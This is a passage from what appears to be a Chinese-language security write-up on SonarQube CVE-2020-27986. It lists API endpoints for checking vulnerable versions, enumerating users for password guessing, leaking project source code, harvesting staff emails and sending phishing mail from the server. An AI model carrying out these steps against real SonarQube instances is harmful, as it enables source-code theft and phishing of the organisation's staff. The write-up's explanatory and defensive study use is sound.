http://example.com/api/server/version EXP crul http://example.com/api/settings/values 0x05 进阶利用思路 一、验证漏洞 通过 /api/server/version 和 /api/settings/values 判断目标系统版本号与是否存在漏洞 二、弱口令 通过 /api/users/search 获取用户列表，对用户密码进行模糊测试 三、源代码泄露 通过 /api/components/search_projects 获取 organization 、Project(ID) 和 Project(Key) 等后续需要的信息 通过 /api/components/tree 或 /batch/project 并代入之前获取的 Project(ID) 和 Project(Key) 参数，获取 File(Key) ，也就是:和其他后续需要的信息 通过 /api/sources/raw 、 /api/sources/index 或 /api/sources/show 并带入之前获取的 File(Key) 参数，获取目标文件的源代码 四、可能存在的横向移动 通过 /api/issues/search 获取人员联络方式(邮件) 获取权限后通过 /api/emails/send 对其人员进行钓鱼攻击 0x06 扩展链接 Atw组织攻击分析及cve 2020 27986进阶利用 【安全事件】黑客利用开源代码平台SonarQube漏洞泄露多家单位源码 CVE-2020-27986 0x7 联系方式 作者 : 08174 "}}